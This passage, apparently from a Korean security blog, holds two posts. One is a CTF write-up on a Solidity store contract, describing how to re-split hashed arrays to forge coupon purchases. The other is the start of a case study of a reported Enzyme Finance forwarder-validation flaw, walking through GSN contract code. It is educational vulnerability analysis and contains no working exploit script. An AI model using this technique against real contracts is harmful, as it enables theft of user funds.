randRangeWithNonce(_blockNumber, 0.0714285714285 ether, 0.09 ether, _nonce[PER_N_ITEM+i]);            _prices[i] = _price;        }        bytes memory _input = abi.encodePacked(_blockNumber);        for(uint256 i = 0; i &lt; PER_N_ITEM; i++) {            _input = abi.encodePacked(_input, _ids[i]);        }        for(uint256 id = 0; id &lt; PER_N_ITEM; id++) {            _input = abi.encodePacked(_input, _prices[id]);        }        bytes32 hash = keccak256(_input);        _discountInfo.blockNumber = _blockNumber;        _discountInfo.discountedItems = _ids;        _discountInfo.discountedPrices = _prices;        _discountInfo.discountCoupon = hash;        return (_blockNumber, _ids, _prices, hash);    }    function buyWithCoupon(bytes32 _coupon, uint256[] memory _ids, uint256[] memory _prices, uint256[] memory _amounts) public payable {        if (discountInfos[block.number].discountCoupon != _coupon || discountInfos[block.number].discountCoupon == 0) revert NotIssued();        if (used[_coupon]) revert AlreadyUsed();        bytes memory _input = abi.encodePacked(block.number);        for(uint256 i = 0; i &lt; _ids.length; i++) {            _input = abi.encodePacked(_input, _ids[i]);        }        for(uint256 i = 0; i &lt; _prices.length; i++) {            _input = abi.encodePacked(_input, _prices[i]);        }        bytes32 _hash = keccak256(_input);        if (_hash != _coupon) revert NotMatched();        used[_coupon] = true;        uint256 _totalAmount = 0;        for(uint256 i = 0; i &lt; _ids.length; i++) {            uint256 _amount = _amounts[i];            _totalAmount += _prices[i] * _amount;            totalBalances[msg.sender][bytes1(uint8(_ids[i]))] += _amount;        }        require(_totalAmount &lt;= msg.value);        uint256 left = (msg.value - _totalAmount);        if (left &gt; 0) {            (bool success, bytes memory data) = msg.sender.call{value: left}(\"\");            if(!success) revert LowLevelFailed();        }    }    function buy(uint256[] memory _ids, uint256[] memory _amounts) public payable {        uint256 _totalAmount = 0;        for(uint256 i = 0; i &lt; _ids.length; i++) {            uint256 _amount = _amounts[i];            _totalAmount += REGULAR_PRICE * _amount;            totalBalances[msg.sender][bytes1(uint8(_ids[i]))] += _amount;        }        require(_totalAmount &lt;= msg.value);        uint256 left = (msg.value - _totalAmount);        if (left &gt; 0) {            (bool success, bytes memory data) = msg.sender.call{value: left}(\"\");            if(!success) revert LowLevelFailed();        }    }    function resell(uint256 _id, uint256 _amount) public {        if (totalBalances[msg.sender][bytes1(uint8(_id))] &lt; _amount) _amount = totalBalances[msg.sender][bytes1(uint8(_id))];        totalBalances[msg.sender][bytes1(uint8(_id))] -= _amount;        uint256 _amt = _amount * REGULAR_PRICE / 2;        (bool success, bytes memory data) = msg.sender.call{value: _amt}(\"\");        if(!success) revert LowLevelFailed();    }    function give(uint256 _id, uint256 _amount, address _to) public {               if (totalBalances[msg.sender][bytes1(uint8(_id))] &lt; _amount) _amount = totalBalances[msg.sender][bytes1(uint8(_id))];        totalBalances[msg.sender][bytes1(uint8(_id))] -= _amount;        totalBalances[_to][bytes1(uint8(_id))] += _amount;    }    receive() payable external {}}Store.sol의 코드는 위와 같다. 함수가 몇 개 없어서 로직 분석은 빠르게 할 수 있다.    struct DiscountInfo {        uint256 blockNumber;        uint[] discountedItems;        uint[] discountedPrices;        bytes32 discountCoupon;    }    struct Buy {        uint256[] ids;        uint256[] prices;        uint256[] amounts;    }    uint256 public constant REGULAR_PRICE = 0.1 ether;    uint256 public constant PER_N_ITEM = 5;    bytes public constant  ALPHABETS = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ\";    // blockNumber -&gt; discountInfo    mapping (uint256 =&gt; DiscountInfo) public discountInfos;    // coupon -&gt; bool    mapping (bytes32 =&gt; bool) public used;     // nonce -&gt; bool    mapping(uint256 =&gt; bool) public nonces;    // owner =&gt; alphabet =&gt; amount    mapping(address =&gt; mapping(bytes1 =&gt; uint256)) public totalBalances;문제에서 사용될 변수들은 위와 같이 정의되어 있다.   function buyWithCoupon(bytes32 _coupon, uint256[] memory _ids, uint256[] memory _prices, uint256[] memory _amounts) public payable {        if (discountInfos[block.number].discountCoupon != _coupon || discountInfos[block.number].discountCoupon == 0) revert NotIssued();        if (used[_coupon]) revert AlreadyUsed();        bytes memory _input = abi.encodePacked(block.number);        for(uint256 i = 0; i &lt; _ids.length; i++) {            _input = abi.encodePacked(_input, _ids[i]);        }        for(uint256 i = 0; i &lt; _prices.length; i++) {            _input = abi.encodePacked(_input, _prices[i]);        }        bytes32 _hash = keccak256(_input);        if (_hash != _coupon) revert NotMatched();        used[_coupon] = true;        uint256 _totalAmount = 0;        for(uint256 i = 0; i &lt; _ids.length; i++) {            uint256 _amount = _amounts[i];            _totalAmount += _prices[i] * _amount;            totalBalances[msg.sender][bytes1(uint8(_ids[i]))] += _amount;        }        require(_totalAmount &lt;= msg.value);        uint256 left = (msg.value - _totalAmount);        if (left &gt; 0) {            (bool success, bytes memory data) = msg.sender.call{value: left}(\"\");            if(!success) revert LowLevelFailed();        }    }buyWithCoupon() 함수는 생성된 쿠폰을 이용해서 문자를 구매하는 함수이다. issueDiscountCoupon() 함수에서 생성된 쿠폰을 기반으로 원하는 수량만큼 구매한다.    function buy(uint256[] memory _ids, uint256[] memory _amounts) public payable {        uint256 _totalAmount = 0;        for(uint256 i = 0; i &lt; _ids.length; i++) {            uint256 _amount = _amounts[i];            _totalAmount += REGULAR_PRICE * _amount;            totalBalances[msg.sender][bytes1(uint8(_ids[i]))] += _amount;        }        require(_totalAmount &lt;= msg.value);        uint256 left = (msg.value - _totalAmount);        if (left &gt; 0) {            (bool success, bytes memory data) = msg.sender.call{value: left}(\"\");            if(!success) revert LowLevelFailed();        }    }buy() 함수는 위와 같다. 우리가 원하는 알파벳을 살 수 있다. 코드를 보면 알파벳 하나당 0.1 ether에 구매할 수 있는 것을 확인할 수 있다. 그러나 우리가 구매해야하는 총 문자 개수는 MERRY CHRISTMAS로 14개이다. 현재 우리에게 제공된 잔액은 1 ether인데 buy() 함수를 이용해서 모든 알파벳을 구매하려면 1.4 ehter + gas가 필요하기 때문에 구매를 할 수 없다.    function give(uint256 _id, uint256 _amount, address _to) public {               if (totalBalances[msg.sender][bytes1(uint8(_id))] &lt; _amount) _amount = totalBalances[msg.sender][bytes1(uint8(_id))];        totalBalances[msg.sender][bytes1(uint8(_id))] -= _amount;        totalBalances[_to][bytes1(uint8(_id))] += _amount;    }give() 함수는 위와 같다. 우리가 구매한 알바벳을 타 주소로 전달할 수 있다. 즉, 우리는 MERRY CHRISTMAS에 포함되어 있는 모든 문자를 구매 후에 give() 함수를 통해서 house 컨트랙트 주소로 넘기면 된다.function issueDiscountCoupon(uint256 _blockNumber, uint256[] memory _nonce) public returns(uint, uint256[] memory, uint256[] memory, bytes32) {        DiscountInfo storage _discountInfo = discountInfos[_blockNumber];        uint256[] memory _prices = new uint256[](PER_N_ITEM);        uint256[] memory _ids = randSample(_blockNumber, _nonce);        for(uint256 i = 0; i &lt; PER_N_ITEM; i++) {            uint256 _price = randRangeWithNonce(_blockNumber, 0.0714285714285 ether, 0.09 ether, _nonce[PER_N_ITEM+i]);            _prices[i] = _price;        }        bytes memory _input = abi.encodePacked(_blockNumber);        for(uint256 i = 0; i &lt; PER_N_ITEM; i++) {            _input = abi.encodePacked(_input, _ids[i]);        }        for(uint256 id = 0; id &lt; PER_N_ITEM; id++) {            _input = abi.encodePacked(_input, _prices[id]);        }        bytes32 hash = keccak256(_input);        _discountInfo.blockNumber = _blockNumber;        _discountInfo.discountedItems = _ids;        _discountInfo.discountedPrices = _prices;        _discountInfo.discountCoupon = hash;        return (_blockNumber, _ids, _prices, hash);    }issueDiscountCoupon() 함수는 전달받은 블록 번호와 nonce 값을 기반으로 쿠폰을 생성한다. 이 쿠폰이 생성될 때 할일을 받을 알파벳과 할인율은 nonce 값과 블록 번호에 의해서 생성된다. 쿠폰 번호는 nonce와 블록 번호를 이용해서 구한 _ids + _prices를 모두 바이트 변환하여 더한 값을 해시로 생성한다.    function randSample(uint256 _blockNumber, uint256[] memory _nonces) internal returns (uint[] memory) {        uint len = PER_N_ITEM;        uint[] memory _samples = new uint[](len);         for(uint i = 0; i &lt; len; i++) {            _samples[i] = randRangeWithNonce(_blockNumber, uint8(ALPHABETS[0]), uint8(ALPHABETS[0]) + ALPHABETS.length - 1, _nonces[i]);        }        return _samples;    }할인을 받을 알파벳은 randSample() 함수로 생성된다. randSample() 함수 내부를 보면 ransRangeWithNonce() 함수로 ids 값을 만드는데 보면 nonce 값을 기반으로 알바벳을 구하고 있다.randRangeWithNonce(_blockNumber, 0.0714285714285 ether, 0.09 ether, _nonce[PER_N_ITEM+i]);할인율을 구하는 로직은 randRangeWithNonce() 함수를 위와 같이 호출한다. 위 함수 호출을 통해서 생성될 수 있는 할인 금액의 범위는 0.07 ~ 0.09 ehter이다. 만약 운 좋게 모든 알바벳의 할인 금액이 최저 금액으로 설정 된다고 하더라도 0714285714285 * 14로 0.9999999999989999 ether이다.구매를 해야하는 총 알바벳은 14개이고, buyWithCoupon() 함수에 의해서 구매되는 알바벳은 5개이다. (쿠폰 생성 시에 5개를 생성하기 때문에) 즉, 요청을 3번 나누어서 5, 5, (4 + 1)로 1번, 2번 호출에서는 필요한 알파벳 10개를 구매하도록 하고, 3번째 호출에서 4개는 우리가 필요한 알파벳 마지막 1개는 아무 알파벳을 사도록 한다면 총 15개의 쿠폰을 사는 것이기에 잔액 부족으로 트랜잭션이 거부될 것이다.   function buyWithCoupon(bytes32 _coupon, uint256[] memory _ids, uint256[] memory _prices, uint256[] memory _amounts) public payable {        if (discountInfos[block.number].discountCoupon != _coupon || discountInfos[block.number].discountCoupon == 0) revert NotIssued();        if (used[_coupon]) revert AlreadyUsed();        bytes memory _input = abi.encodePacked(block.number);        for(uint256 i = 0; i &lt; _ids.length; i++) {            _input = abi.encodePacked(_input, _ids[i]);        }        for(uint256 i = 0; i &lt; _prices.length; i++) {            _input = abi.encodePacked(_input, _prices[i]);        }        bytes32 _hash = keccak256(_input);        if (_hash != _coupon) revert NotMatched();        used[_coupon] = true;        uint256 _totalAmount = 0;        for(uint256 i = 0; i &lt; _ids.length; i++) {            uint256 _amount = _amounts[i];            _totalAmount += _prices[i] * _amount;            totalBalances[msg.sender][bytes1(uint8(_ids[i]))] += _amount;        }        require(_totalAmount &lt;= msg.value);        uint256 left = (msg.value - _totalAmount);        if (left &gt; 0) {            (bool success, bytes memory data) = msg.sender.call{value: left}(\"\");            if(!success) revert LowLevelFailed();        }    }buyWithCoupon() 함수를 다시 보자. 컨트랙트 내에 저장되어 있는 쿠폰 번호와 현재 블록 번호와 전달받은 _ids, _prices 값을 기반으로 생성된 쿠폰 값을 비교하여 일치하는지 확인하고 있다. 그러나 이 함수 내에서 _ids, _prices 값에 대해서 길이 검증이 존재하지 않는다. 쿠폰 생성 시에는 _ids, _prices가 각 각 5개로 고정이다._ids = [1, 1, 1, 1, 1]_prices = [1, 1, 1, 1, 1]_ids = [1, 1]_prices = [1, 1, 1, 1, 1, 1, 1, 1]먼저 알아야 할 내용은 첫 번째 값과 두 번째 값의 해시 값은 동일하다는 것이다. 이유는 쿠폰을 생성할 때, 각 값을 단순하게 이전 바이트 값에 현재 바이트 값을 더해서 해시화하기 때문이다. 이를 이용하면 구매할 때 꼭 5개의 알파벳을 사지 않고, 우리가 원하는 개수만큼 알파벳을 구매할 수 있다. _ids에서 사지 않을 알파벳은 _prices로 옮기면 된다.  공격 시나리오  randRangeWithNonce() 함수를 통해서 우리가 구해야 하는 알파벳들과 일치하는 Nonce 값을 찾는다.  Step-1에서 찾은 Nonce 값을 2개 또는 3개로 쿠폰을 생성한다.  생성한 쿠폰으로 알바펫을 사고(2개 또는 3~4개), 이를 give() 함수로 house로 보낸다."
  },
  
  {
    "title": "Dive into the real world: 0x01",
    "url": "/posts/Enzyme-Finance-Vuln/",
    "categories": "Bug Case",
    "tags": "",
    "date": "2023-12-18 00:00:00 +0900",
    





    
    "snippet": "개요2023년 3월 28일에 한 연구원에 의해서 Enyzeme Finance에서 취약점이 제보되었다. 해당 취약점은 Gas Station Network(GSN)라는 네트워크의 함수를 Enzyeme Finance에서 재정의하여 사용하는 과정에서 포워드 검증이 미흡하게 구현되어 발생했다.Enzyme Finance란Enzyme Finance은 이더리움기반의...",
    "content": "개요2023년 3월 28일에 한 연구원에 의해서 Enyzeme Finance에서 취약점이 제보되었다. 해당 취약점은 Gas Station Network(GSN)라는 네트워크의 함수를 Enzyeme Finance에서 재정의하여 사용하는 과정에서 포워드 검증이 미흡하게 구현되어 발생했다.Enzyme Finance란Enzyme Finance은 이더리움기반의 온체인 자산 관리 프로토콜이다. 이 프로토콜을 이용하면 사용자는 암호화폐 및 기타 디지털 자산과 같은 다양한 자산을 이용하여 맞춤형 투자 전략을 생성, 관리 및 투자 등의 서비스를 이용할 수 있다. 또한 이 Enzyme는 GSN를 이용하여 사용자가 Gas Fee를 지불하지 않고, Ethereum 스마트 계약과 상호 작용할 수 있도록 한다.Gas Station Network란GSN는 DApp을 사용하는 사용자들 대신 수수료를 지불하는 분산형 중계기 네트워크이다. DApp을 사용하기 위해서는 사용자가 매 트랜잭션마다 수료를 지불해야 하며, 이전에 사용자는 Ethereum을 개인 지갑에 충전을 해야한다. 이러한 특성 때문에 DApp은 일반 사용자들에게는 진입 장벽이 높을 수가 있지만 이 GSN가 적용되어 있는 Enzyme에서는 사용자가 가스 수수료를 지불하지 않고도 사용할 수 있기 때문에 진입 장벽을 낮출 수 있다.GSN는 Meta Transaction을 사용하는데 이를 간단하게 설명하면 DApp을 사용할 때 최종 사용자가 가스 비용을 지불해야 할 필요성을 없애는 간단한 개념이다. 즉, 사용자는 자신도 모르게 블록체인을 사용하며, 외부 지갑을 연결하거나 거래소에서 Ethereum을 구매할 필요 없이 블록체인을 사용한다는 것이다.Relay Server중개 서버는 사용자의 트랜잭션을 받고, 해당 트랜잭션을 중개하고, 이를 블록체인으로 브로드 캐스팅하는 서버이이다. 이 중개 서버는 가스 비용을 내야하는 중개자의 Account Key를 제어한다.PaymasterPaymaster는 GSN에서 중요한 역할을 하는 컨트랙트 중 하나이다. 메타 트랜잭션을 승인할지 거부할지를 결정하는 다양한 비즈니스 로직이 포함되며 애플리케이션은 논리를 사용자 정의하여 지불해야 할 거래와 거부해야 하는 거래를 정의할 수 있다. 이뿐만 아니라 Relay Server로 지불되는 가스 비용을 관리하고 조정한다.Relay HubRelayHub는 GSN에서 사용자, Relay Server, Paymaster간의 연결 지점을 관리하며 상호 작용하도록 도와주는 GSN에서 중요한 역할을 하는 컨트랙트 중 하나이다.Trusted ForwarderForwarded 컨트랙트는 GSN 네트워크 내에서 신뢰할 수 있는 유일한 구성 요소이며 Recipient 컨트랙트는 원래 발신자의 메시지와 nonce를 확인하기 위해 Forwarded를 사용한다.Meta Transaction 흐름  Transaction의 세부 정보가 포함된 서명된 메시지를 중개 Relay Server로 전송한다.  Relay Server는 Transaction을 확인하고, 비용을 충당할 만큼 충분한 수수료가 있는지 확인한다.  Relay Server는 사용자의 서명된 메시지, 신뢰할 수 있는 Forwarder의 주소, Paymaster의 주소를 사용하여 Relay Hub를 호출하는 새로운 Transaction을 생성한다.  Relay Server는 새로운 Transaction을 서명하고, 이더리움 네트워크로 전송하며, 필요한 가스 비용을 미리 지불한다.  이 Transaction을 받는다면 Relay Hub는 사용자의 서명된 메시지와 함께 신뢰하는 Forwarder 컨트랙트를 호출하고, Recipient 컨트랙트를 호출한다.  신뢰하는 Forwarder 컨트랙트는 사용자의 시그니처를 검증하고, 사용자의 주소를 복구하고 Transaction을  Recipient 컨트랙트로 전송한다.  Transaction이 실행되고, Recipient 컨트랙트에 의해서 블록체인의 상태가 업데이트 된다.  Transaction이 완료된 후, Relay Server는 가스비를 지불했으므로 이를 Relay Hub에게 보고한다. Relay Server는 Relay Hub에게 가스비에 대한 보상을 요청한다.  Paymaster 컨트랙트는 거래를 검증하고 가스 요금 및 추가 서비스 요금을 충당하기 위해 자금(토큰 또는 ETH)을 Relay Server로 보낸다.Meta Transaction의 흐름 과정은 위와 같이 정리할 수 있다.주요 컨트랙트 분석StakeManager/// Only the owner can call this function. If the entry does not exist, reverts./// @param relayManager - address that represents a stake entry and controls relay registrations on relay hubs/// @param unstakeDelay - number of blocks to elapse before the owner can retrieve the stake after calling 'unlock'function stakeForRelayManager(address relayManager, uint256 unstakeDelay) external payable;(skip)function withdrawStake(address relayManager) external;(skip)function isRelayManagerStaked(address relayManager, address relayHub, uint256 minAmount, uint256 minUnstakeDelay)    external    view    returns (bool);(skip)/// Slash the stake of the relay relayManager. In order to prevent stake kidnapping, burns half of stake on the way./// @param relayManager - entry to penalize/// @param beneficiary - address that receives half of the penalty amount/// @param amount - amount to withdraw from stakefunction penalizeRelayManager(address relayManager, address payable beneficiary, uint256 amount) external;RelayHub는 위에서 설명한 것처럼 사용자, Relay Server, Paymaster간의 연결 지점을 관리하며 상호 작용하도록 도와주는 GSN에서 중요한 역할을 하는 컨트랙트라고 했다. 이 Relay Hub는 등록 관리를 담당하는 중계 관리자라는 개체를 등록하여 운영된다. 중개자는 특정 중개 관리자에게 할당되며 그 관리자를 통해서 Relay Request를 제출한다.위 함수들은 IStakeManager.sol라는 인터페이스 파일 내에 정의되어 있다. stakeForRelayManager() 함수는 중개 관리자가 ERC 20 토큰을 스테이킹할 수 있는 함수이며, withdrawStake() 함수는 중개 관리자가 지분을 철회할 수 있는 함수이며, isRelayManagerStaked() 함수는 Stake 관리자가 유효한지 확인하기 위해서 RelayHub에서 호출되는 주요 함수이다. 그리고 중개 작업자가 잘못된 행동을 할 경우에는 해당 중개 작업자와 연관된 중개 관리자를 처벌할 수 있는데 이때 사용되는 함수이다.Forwarder \t\t/**     * verify the transaction would execute.     * validate the signature and the nonce of the request.     * revert if either signature or nonce are incorrect.     * also revert if domainSeparator or requestTypeHash are not registered.     */    function verify(        ForwardRequest calldata forwardRequest,        bytes32 domainSeparator,        bytes32 requestTypeHash,        bytes calldata suffixData,        bytes calldata signature    ) external view;    /**     * execute a transaction     * @param forwardRequest - all transaction parameters     * @param domainSeparator - domain used when signing this request     * @param requestTypeHash - request type used when signing this request.     * @param suffixData - the extension data used when signing this request.     * @param signature - signature to validate.     *     * the transaction is verified, and then executed.     * the success and ret of \"call\" are returned.     * This method would revert only verification errors. target errors     * are reported using the returned \"success\" and ret string     */    function execute(        ForwardRequest calldata forwardRequest,        bytes32 domainSeparator,        bytes32 requestTypeHash,        bytes calldata suffixData,        bytes calldata signature    )Forwarder 컨트랙트는 2가지의 주요 기능만 가진 간단한 컨트랙트이다. verify() 함수는 보낸 사람이 메시지 데이터에 올바르게 서명했는지 확인하는 함수이고, execute() 함수는 수신자 트랜잭션에서 요청 데이터의 내용을 실행하는 함수이다.function verify(    ForwardRequest calldata req,    bytes32 domainSeparator,    bytes32 requestTypeHash,    bytes calldata suffixData,    bytes calldata sig)external override view {    _verifyNonce(req);    _verifySig(req, domainSeparator, requestTypeHash, suffixData, sig);}구현되어 있는 verify() 함수를 보면 _verifyNonce() 함수를 이용해서 nonce를 확인하고 _verifySig() 함수를 이용해서 보낸 사람의 서명을 확인하는 것을 볼 수 있다. 그리고 verify는 EIP-712를 사용하고 있다.function _verifyNonce(ForwardRequest calldata req) internal view {    require(nonces[req.from] == req.nonce, \"FWD: nonce mismatch\");}function _verifySig(    ForwardRequest calldata req,    bytes32 domainSeparator,    bytes32 requestTypeHash,    bytes calldata suffixData,    bytes calldata sig)internalview {    require(domains[domainSeparator], \"FWD: unregistered domain sep.\");    require(typeHashes[requestTypeHash], \"FWD: unregistered typehash\");    bytes32 digest = keccak256(abi.encodePacked(        \"\\x19\\x01\", domainSeparator,        keccak256(_getEncoded(req, requestTypeHash, suffixData))    ));    require(digest.recover(sig) == req.from, \"FWD: signature mismatch\");}_verifyNonce() 함수와 _verifySig() 함수는 위와 같이 구현되어 있다.function execute(    ForwardRequest calldata req,    bytes32 domainSeparator,    bytes32 requestTypeHash,    bytes calldata suffixData,    bytes calldata sig)external payableoverridereturns(bool success, bytes memory ret) {    _verifySig(req, domainSeparator, requestTypeHash, suffixData, sig);    _verifyAndUpdateNonce(req);    require(req.validUntil == 0 || req.validUntil &gt; block.number, \"FWD: request expired\");    uint gasForTransfer = 0;    if (req.value != 0) {        gasForTransfer = 40000; //buffer in case we need to move eth after the transaction.    }    bytes memory callData = abi.encodePacked(req.data, req.from);    require(gasleft() * 63 / 64 &gt;= req.gas + gasForTransfer, \"FWD: insufficient gas\");    // solhint-disable-next-line avoid-low-level-calls    (success, ret) = req.to.call {        gas: req.gas,        value: req.value    }(callData);    if (req.value != 0 &amp;&amp; address(this).balance &gt; 0) {        // can't fail: req.from signed (off-chain) the request, so it must be an EOA...        payable(req.from).transfer(address(this).balance);    }    return (success, ret);}execute() 함수는 위와 같이 구현되어 있다. Recipient 컨트랙트를 호출해서 메시지 내용을 실행한다. 이때 Recipient 컨트랙트는 request.to에 저장되고, 이 컨트랙트는 Forwarder를 신뢰하고 모든 기능을 호출할 수 있도록 허용한다.Recipient// SPDX-License-Identifier: MIT// solhint-disable no-inline-assemblypragma solidity &gt;=0.6.9;import \"./interfaces/IRelayRecipient.sol\";/** * A base contract to be inherited by any contract that want to receive relayed transactions * A subclass must use \"_msgSender()\" instead of \"msg.sender\" */abstract contract BaseRelayRecipient is IRelayRecipient {    /*     * Forwarder singleton we accept calls from     */    address private _trustedForwarder;    function trustedForwarder() public virtual view returns (address){        return _trustedForwarder;    }    function _setTrustedForwarder(address _forwarder) internal {        _trustedForwarder = _forwarder;    }    function isTrustedForwarder(address forwarder) public virtual override view returns(bool) {        return forwarder == _trustedForwarder;    }    /**     * return the sender of this call.     * if the call came through our trusted forwarder, return the original sender.     * otherwise, return `msg.sender`.     * should be used in the contract anywhere instead of msg.sender     */    function _msgSender() internal override virtual view returns (address ret) {        if (msg.data.length &gt;= 20 &amp;&amp; isTrustedForwarder(msg.sender)) {            // At this point we know that the sender is a trusted forwarder,            // so we trust that the last bytes of msg.data are the verified sender address.            // extract sender address from the end of msg.data            assembly {                ret := shr(96,calldataload(sub(calldatasize(),20)))            }        } else {            ret = msg.sender;        }    }    /**     * return the msg.data of this call.     * if the call came through our trusted forwarder, then the real sender was appended as the last 20 bytes     * of the msg.data - so this method will strip those 20 bytes off.     * otherwise (if the call was made directly and not through the forwarder), return `msg.data`     * should be used in the contract instead of msg.data, where this difference matters.     */    function _msgData() internal override virtual view returns (bytes calldata ret) {        if (msg.data.length &gt;= 20 &amp;&amp; isTrustedForwarder(msg.sender)) {            return msg.data[0:msg.data.length-20];        } else {            return msg.data;        }    }}중재된 Transaction을 받고 싶은 모든 컨트랙트는 BaseRelayRecipient 컨트랙트를 구현해야한다. trustedForwarder(),  _setTrustedForwarder(), isTrustedForwarder() 함수를 이용해서 신뢰하는 Forwarder를 설정하고, Forwarder가 신뢰할 수 있는지 확인하는 함수이다. _msgSender(), _msgData() 함수는 msg.sender이 신뢰할 수 있는 Forwarder일 경우 original sender/data를 가져온다.Paymasterfunction preRelayedCall(    GsnTypes.RelayRequest calldata relayRequest,    bytes calldata signature,    bytes calldata approvalData,    uint256 maxPossibleGas)externalreturns(bytes memory context, bool rejectOnRecipientRevert);function postRelayedCall(    bytes calldata context,    bool success,    uint256 gasUseWithoutPost,    GsnTypes.RelayData calldata relayData) external;IPaymaster 인터페이스를 사용하면 Paymaster 로직을 사용자 정의하여 중개자의 요청을 처리할 수 있다. 이때 중요한 두 가지의 기능은 preRelayedCall(), postRelayedCall() 함수이다.preRelayedCall() 함수는 Paymaster가 중계된 호출(relayed call)을 지불할 것인지 여부를 확인하는 함수로 RelayHub에서 항상 호출된다. 그리고 preRelayedCal() 함수가 Revert를 호출하지 않으면 중계된 호출의 가스 비용을 부담한다.postRelayedCall() 함수는 Recipient 계약에서 요청된 호출(request call)이 실행된 후에 RelayHub에서 호출되는 함수이다. 이 기능 트랜잭션 기록, 이벤트 발생, Paymaster 잔액 보충과 같은 작업을 수행하며 Enzyme Finance 또한 이를 Paymaster 잔액 보충으로 사용하고 있다.// SPDX-License-Identifier: GPL-3.0-onlypragma solidity ^0.8.0;pragma abicoder v2;import \"../forwarder/IForwarder.sol\";import \"../BasePaymaster.sol\";contract TestPaymasterEverythingAccepted is BasePaymaster {    function versionPaymaster() external view override virtual returns (string memory){        return \"2.2.3+opengsn.test-pea.ipaymaster\";    }    event SampleRecipientPreCall();    event SampleRecipientPostCall(bool success, uint actualCharge);    function preRelayedCall(        GsnTypes.RelayRequest calldata relayRequest,        bytes calldata signature,        bytes calldata approvalData,        uint256 maxPossibleGas    )    external    override    virtual    returns (bytes memory, bool) {        (signature);        _verifyForwarder(relayRequest);        (approvalData, maxPossibleGas);        emit SampleRecipientPreCall();        return (\"no revert here\",false);    }    function postRelayedCall(        bytes calldata context,        bool success,        uint256 gasUseWithoutPost,        GsnTypes.RelayData calldata relayData    )    external    override    virtual    {        (context, gasUseWithoutPost, relayData);        emit SampleRecipientPostCall(success, gasUseWithoutPost);    }    function deposit() public payable {        require(address(relayHub) != address(0), \"relay hub address not set\");        relayHub.depositFor{value:msg.value}(address(this));    }    function withdrawAll(address payable destination) public {        uint256 amount = relayHub.balanceOf(address(this));        withdrawRelayHubDepositTo(amount, destination);    }}위 컨트랙트 코드는 GSN 네트워크에서 제공하는 Paymaster 예시 컨트랙트 코드이다. 위 코드에서 기억해야 할 부분은 preRelayedCall(), postRelayedCall() 함수가 구현되어 있고, preRelayedCall() 함수 내에서 Forwarder를 검증하는 _verifyForwarder() 함수가 구현되어 있다는 것이다. postRelayedCall() 함수의 context는 preRelayedCall() 함수의 output에 의해 제공되고, gasUseWithoutPost는 현재까지 사용된 정확한 가스이다.function _verifyForwarder(GsnTypes.RelayRequest calldata relayRequest)publicview {    require(address(_trustedForwarder) == relayRequest.relayData.forwarder, \"Forwarder is not trusted\");    GsnEip712Library.verifyForwarderTrusted(relayRequest);}// other libfunction verifyForwarderTrusted(GsnTypes.RelayRequest calldata relayRequest) internal view {    (bool success, bytes memory ret) = relayRequest.request.to.staticcall(        abi.encodeWithSelector(            IRelayRecipient.isTrustedForwarder.selector, relayRequest.relayData.forwarder        )    );    require(success, \"isTrustedForwarder: reverted\");    require(ret.length == 32, \"isTrustedForwarder: bad response\");    require(abi.decode(ret, (bool)), \"invalid forwarder for recipient\");}_verifyForwarder() 함수에서 첫 번째 검증에서는 요청 데이터 내에 포함되어 있는 forwarder가 신뢰하는 forwarder 주소인지 확인하고, 두 번째 검증에서는 Relay request의 forwarder가 recipient 컨트랙트에 저장되어 있는 신뢰된forwarder와 일치하는지 확인한다.RelayHub/// Relays a transaction. For this to succeed, multiple conditions must be met:///  - Paymaster's \"preRelayCall\" method must succeed and not revert///  - the sender must be a registered Relay Worker that the user signed///  - the transaction's gas price must be equal or larger than the one that was signed by the sender///  - the transaction must have enough gas to run all internal transactions if they use all gas available to them///  - the Paymaster must have enough balance to pay the Relay Worker for the scenario when all gas is spent////// If all conditions are met, the call will be relayed and the recipient charged.////// Arguments:/// @param maxAcceptanceBudget - max valid value for paymaster.getGasLimits().acceptanceBudget/// @param relayRequest - all details of the requested relayed call/// @param signature - client's EIP-712 signature over the relayRequest struct/// @param approvalData: dapp-specific data forwarded to preRelayedCall.///        This value is *not* verified by the Hub. For example, it can be used to pass a signature to the Paymaster/// @param externalGasLimit - the value passed as gasLimit to the transaction.////// Emits a TransactionRelayed event.function relayCall(    uint maxAcceptanceBudget,    GsnTypes.RelayRequest calldata relayRequest,    bytes calldata signature,    bytes calldata approvalData,    uint externalGasLimit)externalreturns(bool paymasterAccepted, bytes memory returnValue);RelayHub는 GSN에서 사용자, Relay Server, Paymaster간의 연결 지점을 서로 상호 작용하도록 도와주는 게이트 웨이 역할을 한다고 설명했다. 먼저 중개자가 요청을 실행하기 위해서 RelayCall() 함수를 호출한다. 이 Relay 요청이 성공적으로 마치기 위해서는 IRelayHub.sol에 정의되어 있는 조건들을 모두 만족 시켜야 한다.  preRelayedCall() 함수는 무조건 성공해야 하며 되돌릴 수 없다.  sender는 StakeManager에 적절한 양의 ERC 20 토큰을 스테이킹한 중개 관리자와 연결된 등록된 중개원이여야 한다.  Transaction의 gas price는 보낸 사람이 서명한 gas price와 같거나 커야 한다.  Transaction 내에는 모든 internal transaction을 수용할 수 있을 만큼 충분한 가스가 있어야 한다.  Paymaster는 중개자에게 서비스에 대한 보상을 제공할 수 있을 만큼 충분한 잔액을 보유하고 있어야 한다.위와 같은 조건들을 만족 시킨다면 Relay 요청은 성공적으로 마칠 수 있을 것이다.uint maxAcceptanceBudget : GsnTypes.RelayRequest calldata relayRequest : bytes calldata signature : 중개자가 서명한 Relay 요청bytes calldata approvalData : 사용자 정의 승인 로직을 위해 PreRelayesCall()로 전송된 데이터uint externalGasLimit : 거래에 소비될 수 있는 최대 가스이 함수에서 중요한 매개변수 중 하나는 maxAcceptanceBudget이다. 이는 preRelayedCall() 함수에서 사용되는 가스가 이 한도를 초과하지 않으면 Paymaster에 요금이 청구되지 않는다.// GSNTypes.sol// SPDX-License-Identifier: GPL-3.0-onlypragma solidity ^0.8.0;import \"../forwarder/IForwarder.sol\";interface GsnTypes {    /// @notice gasPrice, pctRelayFee and baseRelayFee must be validated inside of the paymaster's preRelayedCall in order not to overpay    struct RelayData {        uint256 gasPrice;        uint256 pctRelayFee;        uint256 baseRelayFee;        address relayWorker;        address paymaster;        address forwarder;        bytes paymasterData;        uint256 clientId;    }    //note: must start with the ForwardRequest to be an extension of the generic forwarder    struct RelayRequest {        IForwarder.ForwardRequest request;        RelayData relayData;    }}// IForwarder.sol// SPDX-License-Identifier: GPL-3.0-onlypragma solidity &gt;=0.7.6;pragma abicoder v2;interface IForwarder {    struct ForwardRequest {        address from;        address to;        uint256 value;        uint256 gas;        uint256 nonce;        bytes data;        uint256 validUntil;    }maxAcceptanceBudget에 